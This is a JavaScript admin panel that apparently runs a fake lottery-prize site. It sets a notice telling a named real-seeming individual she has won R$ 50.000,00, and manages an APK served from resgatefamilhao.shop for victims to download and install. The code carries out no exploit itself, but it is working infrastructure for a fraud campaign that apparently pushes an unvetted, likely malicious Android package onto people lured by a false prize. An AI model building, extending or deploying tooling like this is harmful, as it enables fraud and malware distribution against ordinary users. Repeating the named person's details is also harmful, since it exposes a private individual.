const WORKER_BASE='https://download.resgatefamilhao.shop';
const API_URL=WORKER_BASE+'/config';
const APK_URL=WORKER_BASE+'/apk';
const APK_STATUS_URL=WORKER_BASE+'/apk/status';
const STORAGE_KEY='campanha-premiada-settings';
const TOKEN_KEY='viva-sorte-admin-token';

const defaults={
  customerName:'VERA LÚCIA APARECIDA GNANI',
  campaignName:'Familhão da Lotérica',
  message:'Sua participação foi essencial e é com enorme satisfação que anunciamos que você foi contemplado com essa premiação especial.',
  prizeValue:'R$ 50.000,00',
  paymentMethod:'acesso',
  paymentCode:'',
  redemptionText:'Sua participação foi essencial e é com enorme satisfação que anunciamos que você foi contemplado com essa premiação especial.',
  companyName:'Empresa responsável',
  cnpj:'49.520.113/0001-07',
  regulationUrl:'#',
  termsUrl:'#'
};

const ids={
  customerName:'nameInput',
  prizeValue:'valueInput',
  campaignName:'campaignInput',
  message:'messageInput',
  paymentMethod:'paymentMethodInput',
  paymentCode:'paymentCodeInput',
  redemptionText:'redemptionTextInput',
  companyName:'companyInput',
  cnpj:'cnpjInput',
  regulationUrl:'regulationInput',
  termsUrl:'termsInput'
};

function toast(msg,duration=2200){
  const t=document.createElement('div');
  t.className='toast';
  t.textContent=msg;
  document.body.appendChild(t);
  setTimeout(()=>t.remove(),duration);
}

function fillForm(data){
  const s={...defaults,...data};
  if(s.paymentMethod==='pix' || s.paymentMethod==='credito') s.paymentMethod='acesso';
  Object.entries(ids).forEach(([key,id])=>{
    const el=document.getElementById(id);
    if(el) el.value=s[key]??'';
  });
}

function collectForm(){
  const data={};
  Object.entries(ids).forEach(([key,id])=>{
    const el=document.getElementById(id);
    data[key]=(el?.value??'').trim();
  });
  return data;
}

function formatBytes(bytes){
  if(!Number.isFinite(bytes) || bytes<0) return '—';
  if(bytes===0) return '0 B';
  const units=['B','KB','MB','GB'];
  const i=Math.min(Math.floor(Math.log(bytes)/Math.log(1024)),units.length-1);
  const value=bytes/Math.pow(1024,i);
  return value.toLocaleString('pt-BR',{maximumFractionDigits:i===0?0:1})+' '+units[i];
}

function getAdminToken(){
  let token=sessionStorage.getItem(TOKEN_KEY)||'';
  if(!token){
    token=prompt('Digite o ADMIN_TOKEN configurado no Cloudflare:')||'';
    token=token.trim();
    if(token) sessionStorage.setItem(TOKEN_KEY,token);
  }
  return token;
}

function authHeaders(extra={}){
  const token=getAdminToken();
  if(!token) throw new Error('TOKEN_REQUIRED');
  return {...extra,'Authorization':'Bearer '+token};
}

function handleUnauthorized(response){
  if(response.status===401){
    sessionStorage.removeItem(TOKEN_KEY);
    throw new Error('UNAUTHORIZED');
  }
}

async function loadGlobalConfig(){
  try{
    const response=await fetch(API_URL+'?t='+Date.now(),{
      method:'GET',
      cache:'no-store',
      headers:{'Accept':'application/json'}
    });
    if(!response.ok) throw new Error('HTTP '+response.status);
    const data=await response.json();
    fillForm(data);
    try{localStorage.setItem(STORAGE_KEY,JSON.stringify(data))}catch{}
  }catch(error){
    console.error(error);
    try{
      const cached=JSON.parse(localStorage.getItem(STORAGE_KEY)||'{}');
      fillForm(cached);
      toast('Não foi possível acessar a configuração global. Exibindo cópia local.',3500);
    }catch{
      fillForm(defaults);
      toast('Não foi possível acessar a configuração global.',3500);
    }
  }
}

async function postConfig(data){
  const response=await fetch(API_URL,{
    method:'POST',
    headers:authHeaders({'Content-Type':'application/json'}),
    body:JSON.stringify(data)
  });

  handleUnauthorized(response);

  if(!response.ok){
    const text=await response.text().catch(()=> '');
    throw new Error('HTTP '+response.status+' '+text);
  }
  return response.json();
}

async function loadApkStatus(){
  const badge=document.getElementById('apkStatusBadge');
  const name=document.getElementById('apkCurrentName');
  const meta=document.getElementById('apkCurrentMeta');
  const deleteButton=document.getElementById('apkDeleteButton');

  try{
    badge.textContent='Verificando...';
    badge.className='apk-status-badge';

    const response=await fetch(APK_STATUS_URL+'?t='+Date.now(),{cache:'no-store'});
    if(!response.ok) throw new Error('HTTP '+response.status);
    const data=await response.json();

    if(data.exists){
      badge.textContent='APK disponível';
      badge.className='apk-status-badge is-online';
      name.textContent=data.fileName||'familhao-resgate.apk';

      const uploaded=data.uploaded ? new Date(data.uploaded).toLocaleString('pt-BR') : '';
      meta.textContent=[formatBytes(data.size),uploaded ? 'Atualizado em '+uploaded : ''].filter(Boolean).join(' • ');
      deleteButton.disabled=false;
    }else{
      badge.textContent='Sem APK';
      badge.className='apk-status-badge is-offline';
      name.textContent='Nenhum APK disponível';
      meta.textContent='Envie um arquivo .apk para habilitar o download no site.';
      deleteButton.disabled=true;
    }
  }catch(error){
    console.error('Erro ao verificar APK:',error);
    badge.textContent='Erro ao verificar';
    badge.className='apk-status-badge is-error';
    name.textContent='Não foi possível consultar o APK';
    meta.textContent='Verifique o Worker e tente novamente.';
    deleteButton.disabled=true;
  }
}

function setApkBusy(busy,text='Enviando...'){
  const upload=document.getElementById('apkUploadButton');
  const del=document.getElementById('apkDeleteButton');
  const input=document.getElementById('apkFileInput');
  const wrap=document.getElementById('apkProgressWrap');
  const bar=document.getElementById('apkProgressBar');
  const progressText=document.getElementById('apkProgressText');

  upload.disabled=busy;
  del.disabled=busy;
  input.disabled=busy;
  wrap.hidden=!busy;
  progressText.textContent=text;
  bar.style.width=busy?'100%':'0%';
}

async function uploadApk(){
  const input=document.getElementById('apkFileInput');
  const file=input.files?.[0];

  if(!file){
    toast('Selecione um arquivo APK primeiro.');
    return;
  }

  if(!file.name.toLowerCase().endsWith('.apk')){
    toast('Selecione somente um arquivo .apk.');
    return;
  }

  setApkBusy(true,'Enviando '+file.name+'...');

  try{
    const response=await fetch(APK_URL,{
      method:'PUT',
      headers:authHeaders({
        'Content-Type':'application/vnd.android.package-archive',
        'X-File-Name':file.name
      }),
      body:file
    });

    handleUnauthorized(response);

    if(!response.ok){
      const text=await response.text().catch(()=> '');
      throw new Error('HTTP '+response.status+' '+text);
    }

    input.value='';
    document.getElementById('apkSelectedInfo').textContent='Nenhum arquivo selecionado.';
    toast('APK enviado/substituído com sucesso.');
    await loadApkStatus();
  }catch(error){
    console.error(error);
    if(error.message==='TOKEN_REQUIRED') toast('Envio cancelado: token não informado.');
    else if(error.message==='UNAUTHORIZED') toast('Token incorreto. Tente novamente.');
    else toast('Erro ao enviar o APK. Tente novamente.',3500);
  }finally{
    setApkBusy(false);
    await loadApkStatus();
  }
}

async function deleteApk(){
  if(!confirm('Tem certeza que deseja excluir o APK atual? O botão de download ficará indisponível até um novo APK ser enviado.')) return;

  setApkBusy(true,'Excluindo APK...');

  try{
    const response=await fetch(APK_URL,{
      method:'DELETE',
      headers:authHeaders()
    });

    handleUnauthorized(response);

    if(!response.ok){
      const text=await response.text().catch(()=> '');
      throw new Error('HTTP '+response.status+' '+text);
    }

    toast('APK excluído com sucesso.');
  }catch(error){
    console.error(error);
    if(error.message==='TOKEN_REQUIRED') toast('Exclusão cancelada: token não informado.');
    else if(error.message==='UNAUTHORIZED') toast('Token incorreto. Tente novamente.');
    else toast('Erro ao excluir o APK.',3500);
  }finally{
    setApkBusy(false);
    await loadApkStatus();
  }
}

document.getElementById('settingsForm')?.addEventListener('submit',async e=>{
  e.preventDefault();
  const button=e.submitter || document.querySelector('.save-button');
  if(button) button.disabled=true;

  try{
    const data=collectForm();
    await postConfig(data);
    try{localStorage.setItem(STORAGE_KEY,JSON.stringify(data))}catch{}
    toast('Alterações salvas globalmente.');
  }catch(error){
    console.error(error);
    if(error.message==='TOKEN_REQUIRED') toast('Salvamento cancelado: token não informado.');
    else if(error.message==='UNAUTHORIZED') toast('Token incorreto. Tente salvar novamente.');
    else toast('Erro ao salvar globalmente. Tente novamente.',3500);
  }finally{
    if(button) button.disabled=false;
  }
});

document.getElementById('restoreButton')?.addEventListener('click',async()=>{
  if(!confirm('Restaurar os valores padrão globalmente?')) return;

  try{
    await postConfig(defaults);
    fillForm(defaults);
    try{localStorage.setItem(STORAGE_KEY,JSON.stringify(defaults))}catch{}
    toast('Padrão restaurado globalmente.');
  }catch(error){
    console.error(error);
    if(error.message==='UNAUTHORIZED') toast('Token incorreto. Tente novamente.');
    else toast('Não foi possível restaurar globalmente.',3500);
  }
});

document.getElementById('apkFileInput')?.addEventListener('change',event=>{
  const file=event.target.files?.[0];
  document.getElementById('apkSelectedInfo').textContent=file
    ? file.name+' • '+formatBytes(file.size)
    : 'Nenhum arquivo selecionado.';
});

document.getElementById('apkUploadButton')?.addEventListener('click',uploadApk);
document.getElementById('apkDeleteButton')?.addEventListener('click',deleteApk);

loadGlobalConfig();
loadApkStatus();
